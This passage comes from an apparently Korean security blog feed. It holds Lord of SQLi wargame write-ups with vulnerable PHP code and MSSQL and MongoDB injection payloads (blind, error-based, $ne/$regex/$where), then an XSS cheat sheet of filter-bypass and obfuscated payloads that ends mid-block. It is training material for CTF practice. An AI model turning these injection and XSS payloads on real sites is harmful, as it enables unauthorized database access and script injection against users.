class="keyword">if</span>($result[<span class="string">'pw'</span>] === $_GET[<span class="string">'pw'</span>]) solve(<span class="string">"nessie"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mssql error based sql injection 문제입니다.<br>mssql에서는 문자열 값과 int를 비교하도록 하면 그 과정에서 문자열을 int로 변환하도록 시도하는데 에러메시지에 해당값이 그대로 노출됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Solution</span><br><span class="line">1. id&#x3D;admin&amp;pw&#x3D;&#39; or id&#x3D;&#39;admin&#39; and pw&#x3D;1--</span><br><span class="line">2. pw&#x3D;&#39; union select * from flag_1q2w3e4r--+-</span><br></pre></td></tr></table></figure><h3 id="42-revenant"><a href="#42-revenant" class="headerlink" title="42. revenant"></a>42. revenant</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = mssql_connect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/master|sys|information|prob|;|waitfor/i'</span>, $_GET[<span class="string">'id'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/master|sys|information|prob|;|waitfor/i'</span>, $_GET[<span class="string">'pw'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select * from prob_revenant where id='&#123;$_GET['id']&#125;' and pw='&#123;$_GET['pw']&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  sqlsrv_query($db,$query);</span><br><span class="line">  <span class="keyword">if</span>(sqlsrv_errors()) <span class="keyword">exit</span>(mssql_error(sqlsrv_errors()));</span><br><span class="line"></span><br><span class="line">  $query = <span class="string">"select * from prob_revenant where id='admin'"</span>; </span><br><span class="line">  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'4'</span>] === $_GET[<span class="string">'pw'</span>]) solve(<span class="string">"revenant"</span>); <span class="comment">// you have to pwn 5th column</span></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mysql 에서는 존재하지 않는 함수인데 mssql에서는 col_name 함수를 사용하면 db명을 인자로 받아 컬럼명을 조회할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Solution</span><br><span class="line">1. id&#x3D;&#39;order by 5--&amp;pw&#x3D;1</span><br><span class="line">2. id&#x3D;admin&amp;pw&#x3D;&#39; or id&#x3D;&#39;admin&#39; and col_name(Object_id(&#39;pro&#39;+&#39;b_revenant&#39;),4)&#x3D;1--+-</span><br><span class="line">3. id&#x3D;admin&amp;pw&#x3D;&#39; or id&#x3D;&#39;admin&#39; and convert(int,&quot;1q2w3e4r&quot;)&#x3D;1-- -</span><br></pre></td></tr></table></figure><h3 id="43-yeti"><a href="#43-yeti" class="headerlink" title="43. yeti"></a>43. yeti</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = mssql_connect(<span class="string">"yeti"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/master|sys|information|;/i'</span>, $_GET[<span class="string">'id'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/master|sys|information|;/i'</span>, $_GET[<span class="string">'pw'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_yeti where id='&#123;$_GET['id']&#125;' and pw='&#123;$_GET['pw']&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  sqlsrv_query($db,$query);</span><br><span class="line"></span><br><span class="line">  $query = <span class="string">"select pw from prob_yeti where id='admin'"</span>; </span><br><span class="line">  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'pw'</span>] === $_GET[<span class="string">'pw'</span>]) solve(<span class="string">"yeti"</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>결과값이 나오지 않으며, 오류 표시도 되지 않으므로 Time based blind injection을 사용하여 문제를 해결해야 합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;admin&amp;pw&#x3D;&#39; if((select pw from prob_yeti where id&#x3D;&#39;admin&#39;)like&#39;%&#39;) waitfor delay &#39;0:0:1&#39;-- -</span><br></pre></td></tr></table></figure><h3 id="44-mummy"><a href="#44-mummy" class="headerlink" title="44. mummy"></a>44. mummy</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = mssql_connect(<span class="string">"mummy"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/master|sys|information|;|\(|\//i'</span>, $_GET[<span class="string">'query'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($_GET[<span class="string">'query'</span>]);$i++) <span class="keyword">if</span>(ord($_GET[<span class="string">'query'</span>][$i]) &lt;= <span class="number">32</span>) <span class="keyword">exit</span>(<span class="string">"%01~%20 can used as whitespace at mssql"</span>);</span><br><span class="line">  $query = <span class="string">"select"</span>.$_GET[<span class="string">'query'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="number">0</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello anonymous&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $query = <span class="string">"select pw from prob_mummy where id='admin'"</span>;</span><br><span class="line">  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'pw'</span>] === $_GET[<span class="string">'pw'</span>]) solve(<span class="string">"mummy"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mssql에서는 컬럼명을 더블 쿼트로 포장할 수 있습니다.<br>그러면 공백을 사용하지 않고 쿼리문을 작성할 수 있죠.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : query&#x3D;&#39;1&#39;from&quot;prob_mummy&quot;where&quot;id&quot;&#x3D;&#39;admin&#39;and&quot;pw&quot;like&#39;%&#39;</span><br></pre></td></tr></table></figure><h3 id="45-kraken"><a href="#45-kraken" class="headerlink" title="45. kraken"></a>45. kraken</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = mssql_connect(<span class="string">"kraken"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/master|information|;/i'</span>, $_GET[<span class="string">'id'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/master|information|;/i'</span>, $_GET[<span class="string">'pw'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="string">"select id from member where id='&#123;$_GET['id']&#125;' and pw='&#123;$_GET['pw']&#125;'"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;&#123;$result['id']&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($krakenFlag === $_GET[<span class="string">'pw'</span>]) solve(<span class="string">"kraken"</span>);<span class="comment">// Flag is in `flag_&#123;$hash&#125;` table, not in `member` table. Let's look over whole of the database.</span></span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>mssql에서는 dbname..sysobjects 구문을 통해 테이블 명을 조회할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Solution</span><br><span class="line">1. pw&#x3D;&#39; union select name from kraken..sysobjects where xtype&#x3D;&#39;U&#39; and name like &#39;flag%&#39;--</span><br><span class="line">2. pw&#x3D;&#39; union select * from flag_ccdfe62b--</span><br></pre></td></tr></table></figure><h3 id="46-cerberus"><a href="#46-cerberus" class="headerlink" title="46. cerberus"></a>46. cerberus</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = mongodb_connect();</span><br><span class="line">  $query = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"id"</span> =&gt; $_GET[<span class="string">'id'</span>],</span><br><span class="line">    <span class="string">"pw"</span> =&gt; $_GET[<span class="string">'pw'</span>]</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;"</span>.json_encode($query).<span class="string">"&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = mongodb_fetch_array($db-&gt;prob_cerberus-&gt;find($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result['id']&#125;&lt;/h2&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] === <span class="string">"admin"</span>) solve(<span class="string">"cerberus"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>PayloadsAllTheThings - NoSQL injection</p><p>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#nosql-injection]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#nosql-injection]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL</a> Injection#nosql-injection)</p></blockquote><p>MongoDB Injection의 문제입니다.<br>arg[$ne]=와 같은 형식으로 파라미터를 전달하면<br>서버에서는 JSON으로 {“arg”{“$ne”, “”}} 와 같이 해석하는데<br>이는 NoSQL의 비교구문이 되므로 arg값이 비어있지 않을 경우<br>쿼리는 항상 true를 리턴하게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;admin&amp;pw[$ne]&#x3D;</span><br></pre></td></tr></table></figure><h3 id="47-siren"><a href="#47-siren" class="headerlink" title="47. siren"></a>47. siren</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = mongodb_connect();</span><br><span class="line">  $query = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"id"</span> =&gt; $_GET[<span class="string">'id'</span>],</span><br><span class="line">    <span class="string">"pw"</span> =&gt; $_GET[<span class="string">'pw'</span>]</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;"</span>.json_encode($query).<span class="string">"&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = mongodb_fetch_array($db-&gt;prob_siren-&gt;find($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello User&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $query = <span class="keyword">array</span>(<span class="string">"id"</span> =&gt; <span class="string">"admin"</span>);</span><br><span class="line">  $result = mongodb_fetch_array($db-&gt;prob_siren-&gt;find($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'pw'</span>] === $_GET[<span class="string">'pw'</span>]) solve(<span class="string">"siren"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>이전 문제와 비슷하지만 실제 pw를 도출하는 것 까지가 목표입니다.<br>arg[$regex]=.* 와 같이 입력해주면<br>서버측에서는 JSON으로 {“arg”:{“$regex”, “.*”}} 와 같이 해석하는데<br>MongoDB 문법으로 정규식 비교문이 됩니다.<br>이를 이용해 한글자씩 대입해 보면 답을 알아낼 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;admin&amp;pw[$regex]&#x3D;^BRUTE_HERE.*</span><br></pre></td></tr></table></figure><h3 id="48-incubus"><a href="#48-incubus" class="headerlink" title="48. incubus"></a>48. incubus</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  $db = mongodb_connect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\(/i'</span>, $_GET[<span class="string">'id'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\(/i'</span>, $_GET[<span class="string">'pw'</span>])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  $query = <span class="keyword">array</span>(<span class="string">"\$where"</span> =&gt; <span class="string">"function()&#123;return obj.id=='&#123;$_GET['id']&#125;'&amp;&amp;obj.pw=='&#123;$_GET['pw']&#125;';&#125;"</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;"</span>.json_encode($query).<span class="string">"&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = mongodb_fetch_array($db-&gt;prob_incubus-&gt;find($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result['id']&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $query = <span class="keyword">array</span>(<span class="string">"id"</span> =&gt; <span class="string">"admin"</span>);</span><br><span class="line">  $result = mongodb_fetch_array($db-&gt;prob_incubus-&gt;find($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'pw'</span>] === $_GET[<span class="string">'pw'</span>]) solve(<span class="string">"incubus"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>마지막 문제입니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solution : id&#x3D;&amp;pw&#x3D;&#39;||obj.id&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;obj.pw[0]&#x3D;&#x3D;&#39;BRUTE_HERE</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS CheatSheet</title>
      <link href="/xss-cheatsheet/"/>
      <url>/xss-cheatsheet/</url>
      
        <content type="html"><![CDATA[<blockquote><p>본 문서는 지속적으로 업데이트됩니다.</p></blockquote><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javas[TAB]cript:alert(1)"</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://rwx.kr/alert.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"http://rwx.kr/alert.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">onerror</span>=<span class="string">alert</span>`<span class="attr">1</span>`&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>/<span class="attr">autofocus</span>/<span class="attr">onfocus</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascr<span class="symbol">&amp;Tab;</span>ipt:alert`1`"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'"</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Uncommon-Tags"><a href="#Uncommon-Tags" class="headerlink" title="Uncommon Tags"></a>Uncommon Tags</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">frameset</span>&gt;</span><span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span> <span class="attr">onloadstart</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// hidden input : only on Firefox (when pressed Alt+Shift+X)</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">accesskey</span>=<span class="string">"X"</span> <span class="attr">onclick</span>=<span class="string">"alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Sandbox-XSS"><a href="#Sandbox-XSS" class="headerlink" title="Sandbox XSS"></a>Sandbox XSS</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html,&lt;iframe</span></span></span><br><span class="line"><span class="tag"><span class="string">src=JavaScript:alert(1)&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Delimiters"><a href="#Delimiters" class="headerlink" title="Delimiters"></a>Delimiters</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%2f : <span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">%09 : <span class="tag">&lt;<span class="name">svg</span><span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">%0a : <span class="tag">&lt;<span class="name">svg</span></span></span><br><span class="line"><span class="tag"><span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">%0c : <span class="tag">&lt;<span class="name">svg</span><span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">%0d : <span class="tag">&lt;<span class="name">svg</span></span></span><br><span class="line"><span class="tag"><span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Obfuscation"><a href="#Obfuscation" class="headerlink" title="Obfuscation"></a>Obfuscation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JJEncode (http://utf-8.jp/public/jjencode.html)</span></span><br><span class="line">$=~[];$=&#123;<span class="attr">___</span>:++$,<span class="attr">$$$$</span>:(![]+<span class="string">""</span>)[$],<span class="attr">__$</span>:++$,<span class="attr">$_$_</span>:(![]+<span class="string">""</span>)[$],<span class="attr">_$_</span>:++$,<span class="attr">$_$$</span>:(&#123;&#125;+<span class="string">""</span>)[$],<span class="attr">$$_$</span>:($[$]+<span class="string">""</span>)[$],<span class="attr">_$$</span>:++$,<span class="attr">$$$_</span>:(!<span class="string">""</span>+<span class="string">""</span>)[$],<span class="attr">$__</span>:++$,<span class="attr">$_$</span>:++$,<span class="attr">$$__</span>:(&#123;&#125;+<span class="string">""</span>)[$],<span class="attr">$$_</span>:++$,<span class="attr">$$$</span>:++$,<span class="attr">$___</span>:++$,<span class="attr">$__$</span>:++$&#125;;$.$_=($.$_=$+<span class="string">""</span>)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+<span class="string">""</span>)[$.__$])+((!$)+<span class="string">""</span>)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!<span class="string">""</span>+<span class="string">""</span>)[$.__$])+($._=(!<span class="string">""</span>+<span class="string">""</span>)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!<span class="string">""</span>+<span class="string">""</span>)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+<span class="string">"\""</span>+$.$_$_+(![]+<span class="string">""</span>)[$._$_]+$.$$$_+<span 